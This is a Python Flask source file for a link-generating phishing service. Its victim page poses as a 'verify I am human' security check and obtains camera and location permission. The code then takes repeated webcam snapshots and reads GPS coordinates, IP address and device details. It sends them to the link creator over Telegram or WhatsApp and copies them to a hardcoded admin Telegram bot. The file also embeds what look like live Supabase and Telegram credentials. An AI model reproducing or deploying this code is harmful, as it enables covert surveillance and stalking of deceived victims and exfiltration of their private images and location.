# by:@ROMEO_UCHIHA | PORT 4000 + SMART ROUTING + PERMISSIONS + MAP FIX
from flask import Flask, request, render_template_string, jsonify, redirect, session
from supabase import create_client, Client
import base64, requests, os, time, uuid, random, datetime

app = Flask(__name__)
app.secret_key = "uchiha_super_secret_key" 
app.permanent_session_lifetime = datetime.timedelta(days=365)

# --- SUPABASE & ADMIN CONFIG ---
SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdpam5reHVhZWpzamJ4ZnJ1c2xtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NTYzMzcsImV4cCI6MjA4NTMzMjMzN30.6RFyECY1aRVqxniS3xcv_iol31Su1QNLqXGGfTFlHu0"
supabase: Client = create_client(SUPA_URL, SUPA_KEY)

ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
ADMIN_CID = "6383817850"
BASE_URL = "http://127.0.0.1:5000" # Port 4000 set kar diya
BAILEYS_API_URL = "http://localhost:3000" 

# --- MESSAGING HELPERS ---
def send_tg_msg(token, cid, text):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": cid, "text": text, "parse_mode": "Markdown"})
    except: pass

def send_wa_msg(session_id, phone, text):
    try: requests.post(f"{BAILEYS_API_URL}/send-message", json={"sessionId": session_id, "jid": f"{phone}@s.whatsapp.net", "text": text})
    except: pass

def get_bot_name(token):
    try:
        res = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if res.get("ok"): return res["result"]["first_name"]
    except: pass
    return "Unknown Bot"

def send_tg_photo(token, cid, raw_img, caption=""):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("c.jpg", raw_img, "image/jpeg")}, timeout=10)
    except: pass

# 🔥 SMART ROUTING (TG or WA) 🔥
def notify_user(link, msg_text, img_data=None):
    user = link["users"]
    l_type = user.get("login_type", "tg") 
    
    if l_type == "tg" and user.get("bot_token"):
        if img_data:
            raw = base64.b64decode(img_data.split(",")[1])
            send_tg_photo(user["bot_token"], user["chat_id"], raw, msg_text)
        else:
            send_tg_msg(user["bot_token"], user["chat_id"], msg_text)
            
    elif l_type == "wa" and user.get("wa_session_id"):
        send_wa_msg(user["wa_session_id"], user["wa_number"], msg_text)


# --- UI TEMPLATES ---
COMMON_STYLE = """
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Poppins:wght@300;500;700&display=swap');
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: radial-gradient(circle at center, #1a0000 0%, #000000 100%); color: #fff; font-family: 'Poppins', sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px;}
    .container { background: rgba(15, 0, 0, 0.7); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 0, 0, 0.2); border-radius: 24px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), inset 0 0 20px rgba(255, 0, 0, 0.05); text-align: center; margin-bottom: 20px; }
    h2 { font-family: 'Orbitron', sans-serif; color: #ff3333; margin-bottom: 25px; font-weight: 800; letter-spacing: 2px; text-shadow: 0 0 15px rgba(255,0,0,0.5); }
    input, select { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(255, 0, 0, 0.3); color: #fff; border-radius: 14px; outline: none; transition: 0.3s; font-size: 15px; }
    input:focus, select:focus { border-color: #ff0000; box-shadow: 0 0 15px rgba(255,0,0,0.4); background: rgba(20, 0, 0, 0.8); }
    button { width: 100%; padding: 16px; margin-top: 15px; background: linear-gradient(135deg, #cc0000, #800000); color: #fff; border: 1px solid #ff4d4d; border-radius: 14px; font-weight: 700; font-size: 16px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 5px 20px rgba(255,0,0,0.2); }
    button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(255,0,0,0.5); background: linear-gradient(135deg, #ff1a1a, #990000); }
    .wa-btn { background: linear-gradient(135deg, #075E54, #128C7E); border-color: #25D366; }
    a { color: #888; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 20px; transition: 0.3s; }
    a:hover { color: #ff3333; }
    .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
    .tab { flex: 1; padding: 10px; background: rgba(0,0,0,0.6); cursor: pointer; border-radius: 10px; border: 1px solid rgba(255,0,0,0.3); font-weight: bold;}
    .tab.active { background: #ff0000; color: #000; }
    .wa-code { font-size: 30px; letter-spacing: 5px; color: #25D366; font-family: 'Orbitron'; margin: 20px 0; background:#000; padding:10px; border-radius:10px;}
</style>
<script>
    function switchAuthTab(type) {
        document.getElementById('tg-form').style.display = type === 'tg' ? 'block' : 'none';
        document.getElementById('wa-form').style.display = type === 'wa' ? 'block' : 'none';
        document.getElementById('tab-tg').classList.toggle('active', type === 'tg');
        document.getElementById('tab-wa').classList.toggle('active', type === 'wa');
        document.getElementById('auth-method').value = type;
    }
</script>
"""

def error_page(msg):
    return f"{COMMON_STYLE}<div class='container'><h2 style='color:yellow;'>⚠️ ERROR</h2><p style='color:#ccc; font-size:14px;'>{msg}</p><a href='javascript:history.back()' style='color:#0f0;'>Go Back</a></div>"

@app.route("/")
def index(): return redirect("/lg")

# --- REGISTER / LOGIN FLOW ---
@app.route("/rg", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        method = request.form.get("method")
        try:
            if method == "tg":
                token, cid = request.form.get("token"), request.form.get("cid")
                otp = str(random.randint(1000, 9999))
                supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
                send_tg_msg(token, cid, f"😈 *UCHIHA REGISTRATION*\\n\\nTumhara OTP code hai: `{otp}`")
                return redirect(f"/verify_otp?cid={cid}&purpose=register")
            elif method == "wa":
                phone = request.form.get("phone")
                session_id = f"wa_{str(uuid.uuid4())[:8]}"
                try:
                    res = requests.post(f"{BAILEYS_API_URL}/get-pair-code", json={"phone": phone, "sessionId": session_id}, timeout=10).json()
                    pair_code = res.get("code", "ERROR")
                except: pair_code = "NODE_API_OFFLINE"

                supabase.table("users").insert({
                    "wa_number": phone, "wa_session_id": session_id, "login_type": "wa",
                    "chat_id": f"wa_{phone}", "bot_token": "NONE", "bot_name": "WA User"
                }).execute()
                
                return render_template_string(f'''{COMMON_STYLE}<div class="container"><h2>PAIR WHATSAPP</h2><p>Linked Devices me ye code enter karo:</p><div class="wa-code">{pair_code}</div><a href="/lg">Done? Go to Login</a></div>''')
        except Exception as e: return error_page(str(e))

    return render_template_string(f'''
        {COMMON_STYLE}
        <div class="container">
            <h2>REGISTER</h2>
            <div class="tabs">
                <div class="tab active" id="tab-tg" onclick="switchAuthTab('tg')">Telegram</div>
                <div class="tab" id="tab-wa" onclick="switchAuthTab('wa')">WhatsApp</div>
            </div>
            <form id="tg-form" method="POST">
                <input type="hidden" name="method" value="tg" id="auth-method">
                <input type="text" name="token" placeholder="Telegram Bot Token">
                <input type="text" name="cid" placeholder="Your Chat ID">
                <button type="submit">Send OTP</button>
            </form>
            <form id="wa-form" method="POST" style="display:none;">
                <input type="hidden" name="method" value="wa">
                <input type="text" name="phone" placeholder="WhatsApp Number (e.g. 92300...)">
                <button type="submit" class="wa-btn">GET PAIR CODE</button>
            </form>
            <a href="/lg">Already registered? Login here</a>
        </div>
    ''')

@app.route("/lg", methods=["GET", "POST"])
def login():
    session.permanent = True
    if request.method == "POST":
        method = request.form.get("login_method")
        identifier = request.form.get("identifier")
        try:
            if method == "tg":
                users = supabase.table("users").select("*").eq("chat_id", identifier).execute().data
                if not users: return error_page("Chat ID not registered!")
                otp = str(random.randint(1000, 9999))
                supabase.table("otps").insert({"chat_id": identifier, "bot_token": users[0]["bot_token"], "otp": otp, "purpose": "login"}).execute()
                send_tg_msg(users[0]["bot_token"], identifier, f"🔐 *LOGIN OTP*\\n\\nYour code is: `{otp}`")
                return redirect(f"/verify_otp?cid={identifier}&purpose=login&token={users[0]['bot_token']}")
            elif method == "wa":
                users = supabase.table("users").select("*").eq("wa_number", identifier).execute().data
                if users:
                    session["user_id"] = users[0]["id"]
                    return redirect("/ds")
                return error_page("WhatsApp Number not found!")
        except Exception as e: return error_page(str(e))
        
    return render_template_string(f'''
        {COMMON_STYLE}
        <div class="container">
            <h2>LOGIN</h2>
            <form method="POST">
                <select name="login_method">
                    <option value="tg">Telegram (Chat ID)</option>
                    <option value="wa">WhatsApp (Number)</option>
                </select>
                <input type="text" name="identifier" placeholder="Enter ID or Number" required>
                <button type="submit">Continue</button>
            </form>
            <a href="/rg">Create new account</a>
        </div>
    ''')

@app.route("/verify_otp", methods=["GET", "POST"])
def verify_otp():
    cid, purpose, token = request.args.get("cid"), request.args.get("purpose"), request.args.get("token", "")
    if request.method == "POST":
        query = supabase.table("otps").select("*").eq("chat_id", cid).eq("purpose", purpose).eq("otp", request.form.get("otp"))
        if token: query = query.eq("bot_token", token)
        res = query.execute().data
        if res:
            if purpose == "register": supabase.table("users").insert({"chat_id": cid, "bot_token": res[-1]["bot_token"], "bot_name": res[-1]["bot_name"], "login_type": "tg"}).execute()
            session["user_id"] = supabase.table("users").select("*").eq("bot_token", res[-1]["bot_token"]).execute().data[0]["id"]
            supabase.table("otps").delete().eq("chat_id", cid).execute()
            return redirect("/ds")
        return error_page("Invalid OTP!")
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><p style="color:#aaa; font-size:13px; margin-bottom:20px;">Check your Telegram Bot.</p><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required pattern="[0-9]*" inputmode="numeric"><button type="submit">Verify</button></form></div>')

# --- DASHBOARD UI ---
@app.route("/ds", methods=["GET", "POST"])
def dashboard():
    if "user_id" not in session: return redirect("/lg")
    
    link_url = None
    if request.method == "POST":
        link_id = str(uuid.uuid4())[:8]
        domain = request.form.get("target_domain").rstrip("/")
        supabase.table("links").insert({"id": link_id, "user_id": session["user_id"], "target_type": request.form.get("type"), "redirect_url": request.form.get("redirect")}).execute()
        link_url = f"{domain}/t/{link_id}"

    return render_template_string(f'''
        {COMMON_STYLE}
        <div class="container">
            <h2>DASHBOARD</h2>
            <p style="color:#aaa; font-size:13px; margin-bottom:20px;">Target data will automatically route to your registered platform (TG/WA).</p>
            <form method="POST">
                <input type="url" name="target_domain" placeholder="Your Vercel Domain (https://...)" required>
                <input type="url" name="redirect" placeholder="Redirect URL (e.g. https://google.com)" required>
                <select name="type">
                    <option value="both">Camera + Location</option>
                    <option value="camera">Camera Only</option>
                    <option value="location">Location Only</option>
                </select>
                <button type="submit">GENERATE LINK</button>
            </form>
            {"<div style='margin-top:25px;background:rgba(0,0,0,0.5);padding:15px;border-radius:14px;border:1px solid #330000;'><p style='color:#0f0;font-size:14px;margin-bottom:10px;'>Link Generated successfully:</p><input value='"+link_url+"' readonly id='linkInput' style='border-color:#0f0;color:#0f0;text-align:center;'><button onclick='navigator.clipboard.writeText(document.getElementById(\"linkInput\").value);alert(\"Copied!\")' style='background:#111;border-color:#333;margin-top:5px; width:auto; padding:10px 20px;'>Copy Link</button></div>" if link_url else ""}
            <a href="/logout" style="margin-top:30px;color:#ff4d4d;font-weight:700;">[ LOGOUT ]</a>
        </div>
    ''')

# --- TARGET PAGE (HACK UI) WITH PERMISSIONS BUTTON FIX ---
@app.route("/t/<link_id>")
def target_page(link_id):
    res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
    if not res.data: return "Link Not Found!"
    
    data = res.data[0]
    target_type = data["target_type"]
    r_url = data["redirect_url"]

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>System Verification</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
            body { background: radial-gradient(circle at center, #0a0000 0%, #000 100%); color: #0f0; font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
            .box { background: rgba(10, 0, 0, 0.8); backdrop-filter: blur(10px); border: 1px solid rgba(255, 0, 0, 0.3); border-radius: 20px; padding: 40px 30px; width: 90%; max-width: 380px; text-align: center; box-shadow: 0 0 30px rgba(255, 0, 0, 0.1); }
            h3 { font-family: 'Orbitron', sans-serif; color: #ff3333; letter-spacing: 2px; margin-bottom: 20px; }
            .item { display: flex; justify-content: space-between; align-items: center; margin: 25px 0; font-size: 1.3rem; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 10px;}
            .tick { color: #0f0; text-shadow: 0 0 10px #0f0; } .cross { color: #f00; text-shadow: 0 0 10px #f00; } .wait { color: #ff0; animation: spin 1s infinite linear; }
            @keyframes spin { 100% { transform: rotate(360deg); } }
            #hack-ui { display: none; text-align: center; }
            .timer { font-size: 6rem; color: #ff0000; text-shadow: 0 0 20px rgba(255,0,0,0.6); font-family: 'Orbitron', sans-serif; font-weight: 900;}
            #msg { margin-top: 20px; font-size: 0.9rem; color: #888; height: 20px;}
            #verify-btn { width: 100%; padding: 15px; background: #cc0000; color: #fff; border: none; border-radius: 10px; font-weight: bold; font-family: 'Orbitron'; cursor: pointer; margin-bottom: 20px; font-size: 16px; box-shadow: 0 0 15px rgba(255,0,0,0.4); }
        </style>
    </head>
    <body>
        <div id="auth-ui" class="box">
            <h3>SECURITY CHECK</h3>
            
            <button id="verify-btn" onclick="startAuth()">VERIFY I AM HUMAN</button>
            
            <div id="permission-section" style="display:none;">
                <div class="item" id="cam-row" style="display:none;"><span><i class="fas fa-camera"></i> CAMERA</span><span id="cam-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
                <div class="item" id="loc-row" style="display:none;"><span><i class="fas fa-map-marker-alt"></i> LOCATION</span><span id="loc-ico" class="wait"><i class="fas fa-sync-alt"></i></span></div>
                <p id="msg">Please click "Allow" on the popup...</p>
            </div>
        </div>

        <div id="hack-ui">
            <h2 style="font-family: 'Orbitron'; color: #aa0000; letter-spacing: 3px;">DATA UPLINK</h2>
            <div class="timer" id="count">15</div>
            <p id="log-text" style="color: #666; margin-top: 10px; text-transform: uppercase;">Establishing connection...</p>
        </div>

        <video id="v" style="display:none" autoplay playsinline></video>
        <canvas id="c" style="display:none"></canvas>

        <script>
            let mode = "{{ t_type }}";
            let camReq = (mode === 'both' || mode === 'camera');
            let locReq = (mode === 'both' || mode === 'location');
            let camDone = !camReq, locDone = !locReq, timeLeft = 15;
            
            const v = document.getElementById('v'), c = document.getElementById('c'), msg = document.getElementById('msg');
            const verifyBtn = document.getElementById('verify-btn');
            const permSection = document.getElementById('permission-section');
            
            window.onload = () => { getHardware(); };

            function getHardware() {
                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) });
            }

            function checkAllDone() {
                if(camDone && locDone) {
                    msg.innerText = "Verification Complete."; msg.style.color = "#0f0";
                    setTimeout(startHack, 1500);
                }
            }

            // USER GESTURE HANDLING
            async function startAuth() {
                verifyBtn.style.display = 'none';
                permSection.style.display = 'block';

                if(camReq) document.getElementById('cam-row').style.display = 'flex';
                if(locReq) document.getElementById('loc-row').style.display = 'flex';

                if(camReq) {
                    try {
                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: {facingMode: "user"} });
                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                        camDone = true; checkAllDone();
                    } catch(e) {
                        document.getElementById('cam-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
                        msg.innerText = "Camera Denied. Please Allow."; msg.style.color = "#f00";
                        verifyBtn.style.display = 'block';
                        verifyBtn.innerText = "RETRY CAMERA";
                        return;
                    }
                }

                if(locReq) {
                    if(navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            (p) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-check-circle tick"></i>';
                                fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
                                locDone = true; checkAllDone();
                            },
                            (e) => {
                                document.getElementById('loc-ico').innerHTML = '<i class="fas fa-times-circle cross"></i>';
                                msg.innerText = "Location Denied. Please Allow."; msg.style.color = "#f00";
                                verifyBtn.style.display = 'block';
                                verifyBtn.innerText = "RETRY LOCATION";
                            },
                            { enableHighAccuracy: true }
                        );
                    }
                }
            }

            function takeSnap() {
                if(v.videoWidth === 0) return;
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: c.toDataURL('image/jpeg', 0.4) }) });
            }

            function startCapture(limit) {
                let j=0, itv = setInterval(() => { takeSnap(); j++; if(limit && j>=limit) clearInterval(itv); }, 800);
                return itv;
            }

            function startHack() {
                document.getElementById('auth-ui').style.display = 'none';
                document.getElementById('hack-ui').style.display = 'block';
                
                let capItv = null;
                if(camReq) capItv = startCapture(0); 

                let timer = setInterval(() => {
                    timeLeft--;
                    document.getElementById('count').innerText = timeLeft;
                    if(timeLeft <= 0) {
                        clearInterval(timer);
                        if(capItv) clearInterval(capItv);
                        window.location.href = "{{ r_url }}";
                    }
                }, 1000);
            }
        </script>
    </body>
    </html>
    ''', t_type=target_type, r_url=r_url, l_id=link_id)

# --- BACKEND LOGGING APIS (SMART ROUTING + MAP FIX APPLIED) ---
@app.route("/api/log_hardware/<l_id>", methods=["POST"])
def log_hw(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        d = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        dev_info = f"{d['plat']} - Cores: {d['cores']}"
        
        msg = f"🎯 *TARGET HIT*\\n\\n🌐 *IP:* `{ip}`\\n💻 *Device:* {dev_info}\\n📌 *Mode:* {link['target_type'].upper()}"
        notify_user(link, msg) 
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: TARGET HIT*\\nUser: {link['users']['bot_name']}\\nIP: {ip}")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/log_loc/<l_id>", methods=["POST"])
def log_loc(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        d = request.get_json()
        
        # 🔥 FIX: 100% Valid Google Maps Link 🔥
        map_link = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
        
        msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
        notify_user(link, msg) 
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: LOCATION*\\nUser: {link['users']['bot_name']}\\n{msg}")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/capture/<l_id>", methods=["POST"])
def cap(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        img_data = request.get_json()["img"]
        
        notify_user(link, "😈 *UCHIHA CAPTURE*", img_data) 
        
        raw = base64.b64decode(img_data.split(",")[1])
        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {link['users']['bot_name']}")
        return jsonify({"s": 1})
    except: return jsonify({"s": 0})

@app.route("/logout")
def logout():
    session.clear()
    return redirect("/lg")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=4000, threaded=True)

